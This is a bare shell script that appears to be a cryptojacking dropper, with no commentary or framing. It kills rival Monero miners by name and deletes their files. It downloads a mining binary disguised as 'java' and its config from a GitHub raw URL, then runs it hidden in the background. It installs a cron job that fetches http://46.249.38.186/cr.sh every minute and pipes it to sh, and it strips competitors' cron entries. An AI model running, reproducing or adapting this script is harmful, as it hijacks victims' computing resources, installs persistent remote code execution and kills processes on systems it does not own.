#!/bin/bash

pkill -f test.conf
pkill -f ubyx
ps ax | grep java.conf | grep bin | awk '{print $1}' | xargs kill -9
pkill -f cpu.c
pkill -f tes.conf
pkill -f psping
ps ax | grep cs.c | grep bin | awk '{print $1}' | xargs kill -9
pkill -f /var/tmp/java-c
pkill -f pscf
pkill -f cryptonight
pkill -f sustes
pkill -f xmrig
pkill -f xmr-stak
pkill -f suppoie
ps ax | grep "config.json -t" | grep -v grep | awk '{print $1}' | xargs kill -9
ps aux | grep "/lib/systemd/systemd" | awk '{if($3>20.0) print $2}' | xargs kill -9
ps ax | grep 'wc.conf\|wq.conf\|wm.conf\|wt.conf' | grep -v grep | grep 'ppl\|pscf\|ppc\|ppp' | awk '{print $1}' | xargs kill -9
rm -rf /var/tmp/pscf*
rm -rf /tmp/pscf*
pkill -f ririg
rm -rf /var/tmp/ntpd
pkill -f /var/tmp/ntpd
rm -rf /var/tmp/ntp
pkill -f /var/tmp/ntp
rm -rf /var/tmp/qq
rm -rf /var/tmp/qq1
pkill -f /var/tmp/qq
rm -rf /tmp/qq
rm -rf /tmp/qq1
pkill -f /tmp/qq
pkill -f /var/tmp/aa
rm -rf /var/tmp/aa

DIR="/tmp"
if [ -a "/tmp/java" ]
then
    if [ -w "/tmp/java" ] && [ ! -d "/tmp/java" ]
    then
        if [ -x "$(command -v md5sum)" ]
        then
            sum=$(md5sum /tmp/java | awk '{ print $1 }')
            echo $sum
            case $sum in
                7f4d9a672bb7ff27f641d29b99ecb08a | b00f4bbd82d2f5ec7c8152625684f853)
                    echo "Java OK"
                ;;
                *)
                    echo "Java wrong"
                    rm -rf /tmp/java
                    pkill -f w.conf
                    sleep 4
                ;;
            esac
        fi
        echo "P OK"
    else
        DIR=$(mktemp -d)/tmp
        mkdir $DIR
        echo "T DIR $DIR"
    fi
else
    if [ -d "/var/tmp" ]
    then
        DIR="/var/tmp"
    fi
    if [ ! -w "/var/tmp/java" ]
    then
        DIR=$(mktemp -d)/tmp
        mkdir $DIR
    else
        pwd
    fi
    echo "P NOT EXISTS"
fi
if [ -d "/tmp/java" ]
then
    DIR=$(mktemp -d)/tmp
    mkdir $DIR
    echo "T DIR $DIR"
fi
WGET="wget -O"
if [ -s /usr/bin/curl ];
then
    WGET="curl -o";
fi
if [ -s /usr/bin/wget ];
then
    WGET="wget -O";
fi

downloadIfNeed()
{
    if [ -x "$(command -v md5sum)" ]
    then
        if [ ! -f $DIR/java ]; then
            echo "File not found!"
            download
        fi
        sum=$(md5sum $DIR/java | awk '{ print $1 }')
        echo $sum
        case $sum in
            7f4d9a672bb7ff27f641d29b99ecb08a | b00f4bbd82d2f5ec7c8152625684f853)
                echo "Java OK"
            ;;
            *)
                echo "Java wrong"
                sizeBefore=$(du $DIR/java)
                if [ -s /usr/bin/curl ];
                then
                    WGET="curl -k -o ";
                fi
                if [ -s /usr/bin/wget ];
                then
                    WGET="wget --no-check-certificate -O ";
                fi
                echo "" > $DIR/tmp.txt
                rm -rf $DIR/java
                download
            ;;
        esac
    else
        echo "No md5sum"
        download
    fi
}

download() {
    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/pscf3 | awk '{ print $1 }')
        echo $sum
        case $sum in
            7f4d9a672bb7ff27f641d29b99ecb08a | b00f4bbd82d2f5ec7c8152625684f853)
                echo "Java OK"
                cp $DIR/pscf3 $DIR/java
            ;;
            *)
                echo "Java wrong"
                download2
            ;;
        esac
    else
        echo "No md5sum"
        download2
    fi
}

download2() {
    $WGET $DIR/java https://raw.githubusercontent.com/ffazop1/mygit/master/x_64

    if [ -x "$(command -v md5sum)" ]
    then
        sum=$(md5sum $DIR/java | awk '{ print $1 }')
        echo $sum
        case $sum in
            7f4d9a672bb7ff27f641d29b99ecb08a | b00f4bbd82d2f5ec7c8152625684f853)
                echo "Java OK"
                cp $DIR/java $DIR/pscf3
            ;;
            *)
                echo "Java wrong"
            ;;
        esac
    else
        echo "No md5sum"
    fi
}

if [ "$(netstat -ant|grep '158.69.133.20\|192.99.142.249\|202.144.193.110'|grep 'ESTABLISHED'|grep -v grep)" ];
then
    ps axf -o "pid %cpu" | awk '{if($2>=30.0) print $1}' | while read procid
    do
        kill -9 $procid
    done
else
    echo "Running"
fi

if [ ! "$(ps -fe|grep '/tmp/java'|grep 'w.conf'|grep -v grep)" ];
then
    downloadIfNeed
    chmod +x $DIR/java
    $WGET $DIR/w.conf https://raw.githubusercontent.com/ffazop1/mygit/master/w.conf
    nohup $DIR/java -c $DIR/w.conf > /dev/null 2>&1 &
    sleep 5
    rm -rf $DIR/w.conf
else
    echo "Running"
fi

if crontab -l | grep -q "46.249.38.186"
then
    echo "Cron exists"
else
    echo "Cron not found"
    LDR="wget -q -O -"
    if [ -s /usr/bin/curl ];
    then
        LDR="curl";
    fi
    if [ -s /usr/bin/wget ];
    then
        LDR="wget -q -O -";
    fi
    (crontab -l 2>/dev/null; echo "* * * * * $LDR http://46.249.38.186/cr.sh | sh > /dev/null 2>&1")| crontab -
fi

pkill -f logo4.jpg
pkill -f logo0.jpg
pkill -f logo9.jpg
pkill -f jvs
pkill -f javs
pkill -f 192.99.142.248
rm -rf /tmp/pscd*
rm -rf /var/tmp/pscd*
crontab -l | sed '/192.99.142.232/d' | crontab -
crontab -l | sed '/192.99.142.226/d' | crontab -
crontab -l | sed '/192.99.142.248/d' | crontab -
crontab -l | sed '/45.77.86.208/d' | crontab -
crontab -l | sed '/144.202.8.151/d' | crontab -
crontab -l | sed '/logo4/d' | crontab -
crontab -l | sed '/logo9/d' | crontab -
crontab -l | sed '/logo0/d' | crontab -
crontab -l | sed '/logo/d' | crontab -
crontab -l | sed '/tor2web/d' | crontab -
